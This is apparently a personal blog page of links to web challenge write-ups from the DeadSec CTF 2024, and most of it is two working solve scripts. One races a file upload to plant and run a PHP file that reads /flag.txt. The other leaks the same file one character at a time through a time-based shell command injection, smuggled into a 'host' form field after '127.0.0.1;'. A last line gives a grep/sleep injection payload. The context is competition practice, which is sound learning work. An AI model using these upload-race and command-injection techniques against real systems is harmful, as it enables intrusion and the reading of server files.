---
title: "web writeups"
date: "2023-05-13"
draft: false
---
colorful board
[first  blood](https://blog.exon.kr/posts/ctf/2024/deadsec/#colorful-board-en)
[anotherslove](https://yun.ng/c/ctf/2024-deadsec-ctf/web/colorful-board)
[mongodb objectid](https://github.com/andresriancho/mongo-objectid-predict?tab=readme-ov-file#mongo-objectid-introduction)

----
[buntime](https://yun.ng/c/ctf/2024-deadsec-ctf/web/buntime)

----
[ezstart](https://0x0oz.github.io/writeups/deadsec-ctf-2024#web)
```
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import warnings
import re
warnings.simplefilter('ignore')

URL = "https://cc435f7badc1e1fda35d576b.deadsec.quest/"
# URL = "http://localhost:1338/"
COUNT = 5

def upload():
    files = {'files': ('foobar.php', b"<?php readfile('/flag.txt') ?>", 'image/jpeg')}
    return requests.post(URL + "upload.php", files=files, verify=False)


def read(timestamp):
    return requests.get(URL + f"tmp/foobar_{timestamp}.php", verify=False)

diff = 0
while True:

    timestamp = int(datetime.now().timestamp()) - diff
    with ThreadPoolExecutor(max_workers=5) as executor:
        r1 = executor.submit(upload)
        rs = [executor.submit(read, timestamp) for _ in range(COUNT)]
        executor.shutdown()


    res = [f.result() for f in rs]
    check = [r.text for r in res if r.status_code == 200]
    if len(check) > 0:
        print(check[0])
        break
    real = int(re.findall("foobar_(.+)\.php", r1.result().text)[0])
    diff = (timestamp - real + diff) // 2
    print(timestamp, real, diff)
```
---
[retrocalc](https://yun.ng/c/ctf/2024-deadsec-ctf/web/retrocalc)

----
using python [bing_revenge](https://blog.exon.kr/posts/ctf/2024/deadsec/#bing-revenge-en)
using bash
```py
import requests
import string

base_time = ''
flag= ''
url = 'http://localhost:7000/flag'
url = 'https://TEAM_URL.deadsec.quest/flag'

session = requests.Session()
response_baseline= session.post(url, data={'host':'127.0.0.1'}, headers={'Content-Type':'application/x-www-form-urlencoded'})
time_baseline = response_baseline.elapsed.total_seconds()

#after a few char leaks it was pretty obvious that it was a uuid4, so i adjusted the alphabet accordingly 
alphabet = string.digits + string.ascii_lowercase + '-' + '}' + '{' 

print(f"Time Baseline: {time_baseline}")

for i in range(len(flag)+1,50):
    print(f"[Round {i}]")
    for char in alphabet:
        payload = {'host':f'127.0.0.1;if [ $(cat /flag.txt|cut -c {i}) = {char} ]; then sleep 5; fi'}
        print(f"Current payload: {payload}")
        response = session.post(url, data=payload, headers={'Content-Type':'application/x-www-form-urlencoded'})
        if response.elapsed.total_seconds() > time_baseline + 4:
            flag += char
            print(f"[*] Found new char '{char}'. Flag: '{flag}'")
            break

```
`;grep "DEAD{x" /flag.txt || sleep 5`